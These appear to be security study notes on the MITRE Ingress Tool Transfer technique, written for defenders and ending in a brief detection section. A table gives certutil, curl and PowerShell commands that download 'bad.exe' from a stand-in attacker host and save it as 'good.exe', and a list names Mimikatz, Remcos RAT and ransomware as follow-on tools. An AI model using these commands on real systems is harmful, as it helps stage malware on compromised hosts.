Threat actors may need to download more tools to achieve their goals, for example:

- A script to automate Discovery and find common vulnerabilities like [Seatbelt](https://github.com/GhostPack/Seatbelt)
- A tool to extract saved passwords or OS credentials like [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- A fully functional Remote Access Trojan (RAT) like [Remcos RAT](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/)
- Finally, a ransomware binary to encrypt the system after the data is stolen

The process of downloading additional malware to the breached system is mapped to the MITRE [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) technique, and it is used in the majority of breaches.

## Common Transfer Methods

|Ingress Tool Transfer Command|Common CMD / PowerShell Commands|
|---|---|
|Via Certutil|`certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe`|
|Via Curl (Windows 10+)|`curl.exe https://blackhat.thm/bad.exe -o good.exe`|
|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|`powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"`|
|Via Graphical Interface|No need to use CMD, just copy-paste malware via RDP or download them via a web browser!|
## Detecting
ote, however, that threat actors often try to avoid detection by downloading the tools from legitimate services like GitHub, so make sure to analyze which process is making the connection, the destination domain, and the file being downloaded. The screenshot below shows a complete event chain:
![[Pasted image 20260314161127.png]]